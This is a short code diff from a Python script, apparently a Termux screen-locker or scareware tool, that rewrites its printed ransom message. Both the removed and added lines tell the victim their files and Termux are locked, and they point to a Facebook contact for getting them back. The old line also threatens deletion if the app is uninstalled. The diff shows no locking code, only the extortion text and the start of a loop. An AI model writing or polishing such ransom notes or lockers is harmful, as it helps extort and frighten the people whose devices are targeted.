@@ -7,7 +7,10 @@ def logo():
   print ("")
   print ("")
   print ("")
-  print("  YOUR FILES AND TERMUX IS LOCK ,DONT TRY TO UNINSTALL THIS APPLICATION OR ALL YOUR FILES BE FULL REMOVED !! >> Facebook :Honey Gainer")
+  print("    YOUR FILES AND TERMUX IS LOCK")
+  print("    If you want your termux and files back")
+  print("    find me on facebook")
+  print("    termucs.helper")
 
 while 1:
   while 1:
